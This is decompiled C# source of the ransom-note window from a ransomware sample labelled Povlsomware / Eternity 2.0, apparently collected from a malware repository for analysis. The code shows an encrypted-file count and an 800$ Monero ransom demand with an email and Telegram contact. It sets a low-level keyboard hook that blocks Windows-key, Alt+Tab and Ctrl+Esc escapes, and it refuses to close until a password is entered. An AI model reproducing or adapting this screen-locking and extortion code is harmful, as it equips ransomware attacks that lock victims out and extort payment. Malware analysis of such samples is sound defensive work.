// Decompiled with JetBrains decompiler
// Type: Povlsomware.PayM3
// Assembly: Microsoft, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 760C2F7B-40FF-4A5F-B63A-F2741DF7F4E8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.Win32.Generic-55bf0aa9c3d746b8e47635c2eae2acaf77b4e65f3e6cbd8c51f6b657cdca4c91.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Povlsomware
{
  public class PayM3 : Form
  {
    private bool success;
    private IntPtr ptrHook;
    private PayM3.LowLevelKeyboardProc objKeyboardProcess;
    private IContainer components;
    private TextBox textBox1;
    private Button button1;
    private Label label1;
    private Label label2;
    private TextBox textBox3;
    private Label label3;
    private TextBox textBox2;
    private BackgroundWorker backgroundWorker1;
    private PictureBox pictureBox1;

    public PayM3()
    {
      this.InitializeComponent();
      this.label2.Text = Program.count.ToString() + " files have been encrypted";
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      string text = this.textBox1.Text;
      if (this.CheckPassword(text.ToCharArray()))
      {
        this.success = true;
        this.button1.Text = "Decrypting... ";
        this.backgroundWorker1.RunWorkerAsync((object) text);
      }
      else
      {
        this.textBox1.Text = string.Empty;
        this.ActiveControl = (Control) this.textBox1;
        this.button1.Text = "Wrong Password... ";
      }
    }

    private bool CheckPassword(char[] input)
    {
      char[] pass = Program.GetPass();
      if (pass.Length != input.Length)
        return false;
      for (int index = 0; index < input.Length; ++index)
      {
        if ((int) pass[index] != (int) input[index])
          return false;
      }
      return true;
    }

    private void Screen_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (this.success)
        return;
      e.Cancel = true;
    }

    private void PayM3_Load(object sender, EventArgs e)
    {
      this.Show();
      ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
      this.objKeyboardProcess = new PayM3.LowLevelKeyboardProc(this.captureKey);
      this.ptrHook = PayM3.SetWindowsHookEx(13, this.objKeyboardProcess, PayM3.GetModuleHandle(mainModule.ModuleName), 0U);
    }

    private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e) => Program.UndoAttack(e.Argument as string);

    private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e) => Application.Exit();

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int id,
      PayM3.LowLevelKeyboardProc callback,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hook);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hook,
      int nCode,
      IntPtr wp,
      IntPtr lp);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string name);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern short GetAsyncKeyState(Keys key);

    private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
    {
      if (nCode >= 0)
      {
        PayM3.KBDLLHOOKSTRUCT structure = (PayM3.KBDLLHOOKSTRUCT) Marshal.PtrToStructure(lp, typeof (PayM3.KBDLLHOOKSTRUCT));
        if (structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.Tab && this.HasAltModifier(structure.flags) || structure.key == Keys.Escape && (Control.ModifierKeys & Keys.Control) == Keys.Control)
          return (IntPtr) 1;
      }
      return PayM3.CallNextHookEx(this.ptrHook, nCode, wp, lp);
    }

    private bool HasAltModifier(int flags) => (flags & 32) == 32;

    private void textBox2_TextChanged(object sender, EventArgs e)
    {
    }

    private void textBox3_TextChanged(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (PayM3));
      this.textBox1 = new TextBox();
      this.button1 = new Button();
      this.label1 = new Label();
      this.label2 = new Label();
      this.textBox3 = new TextBox();
      this.label3 = new Label();
      this.textBox2 = new TextBox();
      this.backgroundWorker1 = new BackgroundWorker();
      this.pictureBox1 = new PictureBox();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.textBox1.Font = new Font("Microsoft Sans Serif", 10f);
      this.textBox1.Location = new Point(57, 355);
      this.textBox1.Margin = new Padding(2, 3, 2, 3);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(812, 23);
      this.textBox1.TabIndex = 0;
      this.button1.BackColor = Color.Lime;
      this.button1.Cursor = Cursors.Hand;
      this.button1.Font = new Font("Microsoft Sans Serif", 12f);
      this.button1.Location = new Point(57, 384);
      this.button1.Margin = new Padding(2, 3, 2, 3);
      this.button1.Name = "button1";
      this.button1.Size = new Size(812, 40);
      this.button1.TabIndex = 1;
      this.button1.Text = "Please decrypt them!";
      this.button1.UseVisualStyleBackColor = false;
      this.button1.Click += new EventHandler(this.Button1_Click);
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold);
      this.label1.ForeColor = Color.Red;
      this.label1.Location = new Point(301, 6);
      this.label1.Margin = new Padding(2, 0, 2, 0);
      this.label1.Name = "label1";
      this.label1.Size = new Size(215, 20);
      this.label1.TabIndex = 2;
      this.label1.Text = "All your files belong to us!";
      this.label1.TextAlign = ContentAlignment.MiddleCenter;
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label2.ForeColor = SystemColors.ButtonFace;
      this.label2.Location = new Point(301, 33);
      this.label2.Margin = new Padding(2, 0, 2, 0);
      this.label2.Name = "label2";
      this.label2.Size = new Size(41, 13);
      this.label2.TabIndex = 3;
      this.label2.Text = "label2";
      this.textBox3.BackColor = SystemColors.ActiveCaptionText;
      this.textBox3.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.textBox3.ForeColor = Color.Red;
      this.textBox3.Location = new Point(305, 49);
      this.textBox3.Margin = new Padding(2, 3, 2, 3);
      this.textBox3.Multiline = true;
      this.textBox3.Name = "textBox3";
      this.textBox3.ReadOnly = true;
      this.textBox3.ScrollBars = ScrollBars.Both;
      this.textBox3.Size = new Size(630, 262);
      this.textBox3.TabIndex = 4;
      this.textBox3.Text = componentResourceManager.GetString("textBox3.Text");
      this.label3.AutoSize = true;
      this.label3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label3.ForeColor = Color.Red;
      this.label3.Location = new Point(53, 332);
      this.label3.Margin = new Padding(2, 0, 2, 0);
      this.label3.Name = "label3";
      this.label3.Size = new Size(124, 20);
      this.label3.TabIndex = 5;
      this.label3.Text = "Enter password:";
      this.textBox2.AcceptsReturn = true;
      this.textBox2.BackColor = SystemColors.ActiveCaptionText;
      this.textBox2.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.textBox2.ForeColor = Color.Red;
      this.textBox2.Location = new Point(11, 172);
      this.textBox2.Margin = new Padding(2);
      this.textBox2.Multiline = true;
      this.textBox2.Name = "textBox2";
      this.textBox2.ReadOnly = true;
      this.textBox2.Size = new Size(290, 139);
      this.textBox2.TabIndex = 6;
      this.textBox2.Text = "Price: 800$ in Monero\r\nEmail: getyourfilesback_s@protonmail.com\r\nTelegram: @RecoverdataU\r\nInfo: monero.org\r\n\r\n ID: 0x0002 \r\n\r\nby Eternity group";
      this.textBox2.TextAlign = HorizontalAlignment.Center;
      this.textBox2.TextChanged += new EventHandler(this.textBox2_TextChanged);
      this.backgroundWorker1.DoWork += new DoWorkEventHandler(this.backgroundWorker1_DoWork);
      this.backgroundWorker1.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.backgroundWorker1_RunWorkerCompleted);
      this.pictureBox1.Image = (Image) componentResourceManager.GetObject("pictureBox1.Image");
      this.pictureBox1.Location = new Point(0, 0);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(239, 167);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.CenterImage;
      this.pictureBox1.TabIndex = 7;
      this.pictureBox1.TabStop = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.ActiveCaptionText;
      this.ClientSize = new Size(959, 457);
      this.Controls.Add((Control) this.pictureBox1);
      this.Controls.Add((Control) this.textBox2);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.textBox3);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.textBox1);
      this.ForeColor = SystemColors.ControlText;
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.Margin = new Padding(2, 3, 2, 3);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (PayM3);
      this.RightToLeft = RightToLeft.No;
      this.ShowInTaskbar = false;
      this.Text = "Eternity 2.0";
      this.TopMost = true;
      this.FormClosing += new FormClosingEventHandler(this.Screen_FormClosing);
      this.Load += new EventHandler(this.PayM3_Load);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private struct KBDLLHOOKSTRUCT
    {
      public Keys key;
      public int scanCode;
      public int flags;
      public int time;
      public IntPtr extra;
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
